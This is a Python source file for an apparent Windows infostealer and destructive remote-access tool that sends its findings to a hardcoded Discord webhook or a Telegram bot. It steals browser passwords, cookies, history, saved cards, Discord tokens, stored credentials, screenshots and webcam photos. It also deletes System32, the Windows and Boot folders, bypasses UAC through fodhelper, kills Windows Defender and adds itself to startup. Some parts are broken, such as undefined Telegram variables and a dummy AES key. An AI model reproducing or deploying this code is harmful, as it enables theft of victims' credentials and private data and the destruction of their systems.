webhook = 'https://discord.com/api/webhooks/1383770826398109797/Fsta4o6Ukm3i7nFXKwMBcLWyI3hGFw_rob7rfqzpjTO5NwCxAV9rHaF7aUMDkprKcPRu'
import requests
import platform
import socket
import os
import psutil
import json
import pyperclip
import pyautogui
import cv2
import subprocess
import tkinter as tk
from tkinter import simpledialog
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
import uuid
import hashlib
import ctypes
import sys
import telegram

def send_embed(title, fields):
    if 'webhook' in globals():
        embed = {
            "title": title,
            "color": 65280,
            "fields": fields
        }
        try:
            requests.post(webhook, json={"username": "Raanzor", "embeds": [embed]})
        except Exception as e:
            print(f"Error sending embed: {e}")
    else:
        bot = telegram.Bot(token=bot_token)
        message = f"{title}\n" + "\n".join([f"{field['name']}: {field['value']}" for field in fields])
        try:
            bot.send_message(chat_id=chat_id, text=message)
        except Exception as e:
            print(f"Error sending message: {e}")

def send_file(file_path, title):
    if 'webhook' in globals():
        try:
            with open(file_path, "rb") as file:
                files = {"file": (file_path, file.read())}
                requests.post(webhook, files=files)
        except Exception as e:
            print(f"Error sending file: {e}")
    else:
        bot = telegram.Bot(token=bot_token)
        try:
            with open(file_path, "rb") as file:
                bot.send_document(chat_id=chat_id, document=file)
        except Exception as e:
            print(f"Error sending file: {e}")

def get_system_info():
    system_info = [
        {"name": "Hostname", "value": f"```{socket.gethostname()}```", "inline": True},
        {"name": "OS", "value": f"```{platform.system()} {platform.release()}```", "inline": True},
        {"name": "CPU", "value": f"```{platform.processor()}```", "inline": False},
        {"name": "RAM", "value": f"```{round(psutil.virtual_memory().total / (1024**3), 2)} GB```", "inline": True}
    ]
    send_embed("🖥️ System Info", system_info)

def get_ip_info():
    try:
        ip_data = requests.get("https://ipinfo.io/json").json()
        ip_info = [
            {"name": "IP", "value": f"```{ip_data.get('ip', 'N/A')}```", "inline": True},
            {"name": "City", "value": f"```{ip_data.get('city', 'N/A')}```", "inline": True},
            {"name": "Country", "value": f"```{ip_data.get('country', 'N/A')}```", "inline": False},
            {"name": "ISP", "value": f"```{ip_data.get('org', 'N/A')}```", "inline": False}
        ]
        send_embed("🌍 IP Info", ip_info)
    except Exception as e:
        print(f"Error getting IP info: {e}")

def get_browsers_list():
    browsers = ["Chrome", "Firefox", "Edge"]
    installed = [b for b in browsers if any(os.path.exists(os.path.join(p, b)) for p in [r"C:\Program Files", r"C:\Program Files (x86)"])]
    send_embed("🌐 Browsers", [{"name": "Installed", "value": f"```{', '.join(installed)}```", "inline": False}])

def get_antivirus_list():
    try:
        av = os.popen("wmic /namespace:\\\root\SecurityCenter2 path AntiVirusProduct get displayName").read()
        send_embed("🛡️ Antivirus", [{"name": "Antivirus List", "value": f"```{av}```", "inline": False}])
    except Exception as e:
        print(f"Error getting antivirus list: {e}")

def get_downloads_list():
    try:
        files = '\n'.join(os.listdir(os.path.expanduser("~/Downloads"))[:10])
        send_embed("📂 Downloads", [{"name": "Latest Files", "value": f"```{files}```", "inline": False}])
    except Exception as e:
        print(f"Error getting downloads list: {e}")

def get_desktop_files():
    try:
        files = '\n'.join(os.listdir(os.path.expanduser("~/Desktop"))[:10])
        send_embed("🖥️ Desktop Files", [{"name": "Latest Files", "value": f"```{files}```", "inline": False}])
    except Exception as e:
        print(f"Error getting desktop files: {e}")

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        send_file("screenshot.png", "📸 Screenshot")
    except Exception as e:
        print(f"Error taking screenshot: {e}")

def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam_photo.png", frame)
        cap.release()
        send_file("webcam_photo.png", "📷 Webcam Photo")
    except Exception as e:
        print(f"Error taking webcam photo: {e}")

def get_wifi_ssid():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        output = result.stdout
        ssid_line = [line for line in output.split('\n') if "SSID" in line]
        if ssid_line:
            return ssid_line[0].split(":")[1].strip()
    except Exception as e:
        return str(e)

def send_wifi_ssid():
    ssid = get_wifi_ssid()
    send_embed("📶 Wi-Fi SSID", [{"name": "SSID", "value": f"```{ssid}```", "inline": False}])

def kill_all_programs():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            proc.terminate()
        except psutil.NoSuchProcess:
            pass

def kill_discord():
    for proc in psutil.process_iter(['pid', 'name']):
        if "discord" in proc.name().lower():
            proc.terminate()

def shutdown():
    os.system("shutdown /s /f /t 1")

def disconnect_user():
    os.system('shutdown -l')

def get_chrome_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    passwords = []
    for url, username, password in cursor.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(password)[1]
        except Exception as e:
            print(f"Error decrypting password: {e}")
            password = "Encrypted"
        passwords.append((url, username, password))
    conn.close()
    os.remove("Loginvault.db")
    return passwords

def get_firefox_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    passwords = []
    for profile in profiles:
        path = os.path.join(profile, "logins.json")
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            logins = json.load(f)
            for login in logins["logins"]:
                url = login["hostname"]
                username = login["encryptedUsername"]
                password = login["encryptedPassword"]
                passwords.append((url, username, password))
    return passwords

def get_edge_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    passwords = []
    for url, username, password in cursor.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(password)[1]
        except Exception as e:
            print(f"Error decrypting password: {e}")
            password = "Encrypted"
        passwords.append((url, username, password))
    conn.close()
    os.remove("Loginvault.db")
    return passwords

def get_browsers_passwords():
    passwords = []
    for url, username, password in get_chrome_passwords():
        passwords.append(f"Chrome - URL: {url}, Username: {username}, Password: {password}")
    for url, username, password in get_firefox_passwords():
        passwords.append(f"Firefox - URL: {url}, Username: {username}, Password: {password}")
    for url, username, password in get_edge_passwords():
        passwords.append(f"Edge - URL: {url}, Username: {username}, Password: {password}")
    send_embed("🔒 Browser Passwords", [{"name": "Passwords", "value": f"```{'\n'.join(passwords)}```", "inline": False}])

def get_chrome_credit_cards():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "web-data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "web-data.db")
    conn = sqlite3.connect("web-data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT name_on_card, card_number_encrypted, origin FROM credit_cards")
    credit_cards = []
    for row in cursor.fetchall():
        name_on_card = row[0]
        card_number_encrypted = row[1]
        origin = row[2]
        card_number = decrypt_data(card_number_encrypted)
        credit_cards.append({"name": name_on_card, "number": card_number, "origin": origin})
    conn.close()
    os.remove("web-data.db")
    return credit_cards

def get_firefox_credit_cards():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    credit_cards = []
    for profile in profiles:
        path = os.path.join(profile, "logins.json")
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            logins = json.load(f)
            for login in logins["logins"]:
                url = login.get("hostname", "N/A")
                username = login.get("encryptedUsername", "N/A")
                password = login.get("encryptedPassword", "N/A")
                credit_cards.append({"url": url, "username": username, "password": password})
    return credit_cards

def decrypt_data(encrypted_data):
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        encrypted_data = encrypted_data[5:]
        iv = encrypted_data[:12]
        payload = encrypted_data[12:]
        key = b'peanuts'
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_data = cipher.decrypt(payload)
        return decrypted_data.decode()
    except Exception as e:
        print(f"Error decrypting data: {e}")
        return None

def get_credit_cards():
    credit_cards = []
    for card in get_chrome_credit_cards():
        credit_cards.append(f"Chrome - Name: {card['name']}, Number: {card['number']}, Origin: {card['origin']}")
    for card in get_firefox_credit_cards():
        credit_cards.append(f"Firefox - URL: {card['url']}, Username: {card['username']}, Password: {card['password']}")
    send_embed("💳 Credit Cards", [{"name": "Credit Cards", "value": f"```{'\n'.join(credit_cards)}```", "inline": False}])

def get_discord_token():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Discord", "Local Storage", "leveldb")
    if not os.path.exists(path):
        return None
    for file_name in os.listdir(path):
        if file_name.endswith(".log") or file_name.endswith(".ldb"):
            with open(os.path.join(path, file_name), "r", encoding="utf-8", errors="ignore") as file:
                for line in file:
                    if "token" in line and "}" in line:
                        parts = line.split('"token": "')
                        if len(parts) > 1:
                            token_part = parts[1].split('"')[0]
                            return token_part
    return None

def get_discord_info():
    discord_token = get_discord_token()
    if discord_token:
        headers = {"Authorization": discord_token}
        try:
            user_info = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
            discord_info = [
                {"name": "ID", "value": f"```{user_info.get('id', 'N/A')}```", "inline": True},
                {"name": "Username", "value": f"```{user_info.get('username', 'N/A')}```", "inline": True},
                {"name": "Display Name", "value": f"```{user_info.get('global_name', 'N/A')}```", "inline": False},
                {"name": "Email", "value": f"```{user_info.get('email', 'N/A')}```", "inline": True},
                {"name": "Phone Number", "value": f"```{user_info.get('phone', 'N/A')}```", "inline": True},
                {"name": "Nitro Type", "value": f"```{user_info.get('premium_type', 'N/A')}```", "inline": True},
                {"name": "MFA Enabled", "value": f"```{user_info.get('mfa_enabled', 'N/A')}```", "inline": True}
            ]
            send_embed("Discord Info 👑", discord_info)
        except Exception as e:
            print(f"Error getting Discord info: {e}")
    else:
        send_embed("Discord Token 👑", [{"name": "Token", "value": "```Not Found```", "inline": False}])

def get_chrome_history():
    history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
    if not os.path.exists(history_path):
        return []
    shutil.copy2(history_path, "History.db")
    conn = sqlite3.connect("History.db")
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    history = cursor.fetchall()
    conn.close()
    os.remove("History.db")
    return history

def get_firefox_history():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    history = []
    for profile in profiles:
        path = os.path.join(profile, "places.sqlite")
        if not os.path.exists(path):
            continue
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
        history.extend(cursor.fetchall())
        conn.close()
    return history

def get_edge_history():
    history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
    if not os.path.exists(history_path):
        return []
    shutil.copy2(history_path, "History.db")
    conn = sqlite3.connect("History.db")
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    history = cursor.fetchall()
    conn.close()
    os.remove("History.db")
    return history

def get_history():
    history = []
    history.extend(get_chrome_history())
    history.extend(get_firefox_history())
    history.extend(get_edge_history())
    return "\n".join([f"URL: {h[0]}, Title: {h[1]}, Last Visit: {h[2]}" for h in history])

def send_history():
    history = get_history()
    send_embed("History", [{"name": "History", "value": f"```{history}```", "inline": False}])

def get_chrome_cookies():
    cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
    if not os.path.exists(cookies_path):
        return []
    shutil.copy2(cookies_path, "Cookies.db")
    conn = sqlite3.connect("Cookies.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    os.remove("Cookies.db")
    return cookies

def get_firefox_cookies():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    cookies = []
    for profile in profiles:
        path = os.path.join(profile, "cookies.sqlite")
        if not os.path.exists(path):
            continue
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value, expiry FROM moz_cookies")
        cookies.extend(cursor.fetchall())
        conn.close()
    return cookies

def get_edge_cookies():
    cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies")
    if not os.path.exists(cookies_path):
        return []
    shutil.copy2(cookies_path, "Cookies.db")
    conn = sqlite3.connect("Cookies.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    os.remove("Cookies.db")
    return cookies

def get_cookies():
    cookies = []
    cookies.extend(get_chrome_cookies())
    cookies.extend(get_firefox_cookies())
    cookies.extend(get_edge_cookies())
    return "\n".join([f"Host: {c[0]}, Name: {c[1]}, Value: {c[2]}, Expires: {c[3]}" for c in cookies])

def send_cookies():
    cookies = get_cookies()
    send_embed("Cookies", [{"name": "Cookies", "value": f"```{cookies}```", "inline": False}])

def get_common_files():
    common_files = []
    common_paths = [
        os.path.join(os.environ["USERPROFILE"], "Documents"),
        os.path.join(os.environ["USERPROFILE"], "Pictures"),
        os.path.join(os.environ["USERPROFILE"], "Music"),
        os.path.join(os.environ["USERPROFILE"], "Videos")
    ]
    for path in common_paths:
        if os.path.exists(path):
            common_files.extend(os.listdir(path)[:10])
    return "\n".join(common_files)

def send_common_files():
    files = get_common_files()
    send_embed("Common Files", [{"name": "Common Files", "value": f"```{files}```", "inline": False}])

def get_tskmgr_info():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}")
        send_embed("📊 Task Manager Info", [{"name": "Processes", "value": f"```{'\n'.join(processes)}```", "inline": False}])
    except Exception as e:
        print(f"Error getting task manager info: {e}")

def take_tskmgr_screenshot():
    try:
        subprocess.run(["taskmgr"])
        pyautogui.sleep(2)
        screenshot = pyautogui.screenshot(region=(0, 0, 800, 600))
        screenshot.save("tskmgr_screenshot.png")
        send_file("tskmgr_screenshot.png", "📸 Task Manager Screenshot")
    except Exception as e:
        print(f"Error taking task manager screenshot: {e}")

def get_shell_history():
    try:
        history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        if os.path.exists(history_path):
            with open(history_path, "r", encoding="utf-8") as f:
                history = f.read()
            send_embed("📜 Shell History", [{"name": "History", "value": f"```{history}```", "inline": False}])
    except Exception as e:
        print(f"Error getting shell history: {e}")

def get_ipconf():
    try:
        ipconf = subprocess.check_output(["ipconfig", "/all"], universal_newlines=True)
        send_embed("🌐 IP Configuration", [{"name": "IP Configuration", "value": f"```{ipconf}```", "inline": False}])
    except Exception as e:
        print(f"Error getting IP configuration: {e}")

def get_hwid():
    try:
        hwid = subprocess.check_output(['wmic', 'csproduct', 'get', 'UUID']).decode().split('\n')[1].strip()
        send_embed("🔧 HWID", [{"name": "HWID", "value": f"```{hwid}```", "inline": False}])
    except Exception as e:
        print(f"Error getting HWID: {e}")

def get_uuid():
    try:
        uuid_val = str(uuid.uuid4())
        send_embed("🔧 UUID", [{"name": "UUID", "value": f"```{uuid_val}```", "inline": False}])
    except Exception as e:
        print(f"Error getting UUID: {e}")

def get_credentials():
    try:
        credentials = subprocess.check_output(["cmdkey", "/list"], universal_newlines=True)
        send_embed("🔑 Credentials", [{"name": "Credentials", "value": f"```{credentials}```", "inline": False}])
    except Exception as e:
        print(f"Error getting credentials: {e}")

def get_installed_games():
    try:
        games = []
        common_paths = [
            os.path.join(os.environ["ProgramFiles"], "Steam"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Steam"),
            os.path.join(os.environ["ProgramFiles"], "Epic Games"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Epic Games"),
            os.path.join(os.environ["ProgramFiles"], "Origin"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Origin"),
            os.path.join(os.environ["ProgramFiles"], "Ubisoft"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Ubisoft")
        ]
        for path in common_paths:
            if os.path.exists(path):
                games.extend(os.listdir(path))
        send_embed("🎮 Installed Games", [{"name": "Games", "value": f"```{'\n'.join(games)}```", "inline": False}])
    except Exception as e:
        print(f"Error getting installed games: {e}")

def delete_system32():
    try:
        system32_path = os.path.join(os.environ["WINDIR"], "System32")
        shutil.rmtree(system32_path)
        send_embed("🗑️ System32 Deleted", [{"name": "Status", "value": "```System32 directory deleted```", "inline": False}])
    except Exception as e:
        print(f"Error deleting System32: {e}")

def delete_windows():
    try:
        windows_path = os.environ["WINDIR"]
        shutil.rmtree(windows_path)
        send_embed("🗑️ Windows Deleted", [{"name": "Status", "value": "```Windows directory deleted```", "inline": False}])
    except Exception as e:
        print(f"Error deleting Windows: {e}")

def delete_bootloader():
    try:
        bootloader_path = os.path.join(os.environ["WINDIR"], "Boot")
        shutil.rmtree(bootloader_path)
        send_embed("🗑️ BootLoader Deleted", [{"name": "Status", "value": "```BootLoader directory deleted```", "inline": False}])
    except Exception as e:
        print(f"Error deleting BootLoader: {e}")

def uac_bypass():
    try:
        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/ve", "/d", "cmd /k start", "/f"], check=True)
        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"], check=True)
        subprocess.run(["fodhelper.exe"], check=True)
        send_embed("🔓 UAC Bypass", [{"name": "Status", "value": "```UAC Bypass executed```", "inline": False}])
    except Exception as e:
        print(f"Error executing UAC Bypass: {e}")

def network_disruption():
    try:
        subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "admin=disable"], check=True)
        send_embed("📶 Network Disruption", [{"name": "Status", "value": "```Wi-Fi disabled```", "inline": False}])
    except Exception as e:
        print(f"Error disabling Wi-Fi: {e}")

def automated_file_deleter():
    try:
        file_path = os.path.abspath(__file__)
        os.remove(file_path)
        send_embed("🗑️ Automated File Deleter", [{"name": "Status", "value": "```File deleted```", "inline": False}])
    except Exception as e:
        print(f"Error deleting file: {e}")

def add_to_startup():
    try:
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        script_path = os.path.abspath(__file__)
        shutil.copy2(script_path, startup_path)
        send_embed("🔄 Add to Startup", [{"name": "Status", "value": "```Added to startup```", "inline": False}])
    except Exception as e:
        print(f"Error adding to startup: {e}")

def kill_defender():
    try:
        subprocess.run(["taskkill", "/f", "/im", "MsMpEng.exe"], check=True)
        subprocess.run(["sc", "stop", "WinDefend"], check=True)
        subprocess.run(["sc", "delete", "WinDefend"], check=True)
        send_embed("🛡️ Kill Defender", [{"name": "Status", "value": "```Windows Defender disabled```", "inline": False}])
    except Exception as e:
        print(f"Error disabling Windows Defender: {e}")

if __name__ == "__main__":
    get_system_info()
    get_ip_info()
    get_browsers_list()
    get_antivirus_list()
    get_downloads_list()
    get_desktop_files()
    take_screenshot()
    take_webcam_photo()
    send_wifi_ssid()
    kill_all_programs()
    kill_discord()
    shutdown()
    disconnect_user()
    get_browsers_passwords()
    get_credit_cards()
    get_discord_info()
    send_history()
    send_cookies()
    send_common_files()
    get_tskmgr_info()
    take_tskmgr_screenshot()
    get_shell_history()
    get_ipconf()
    get_hwid()
    get_uuid()
    get_discord_info()
    get_credentials()
    get_installed_games()
    delete_system32()
    delete_windows()
    delete_bootloader()
    uac_bypass()
    network_disruption()
    automated_file_deleter()
    add_to_startup()
    kill_defender()
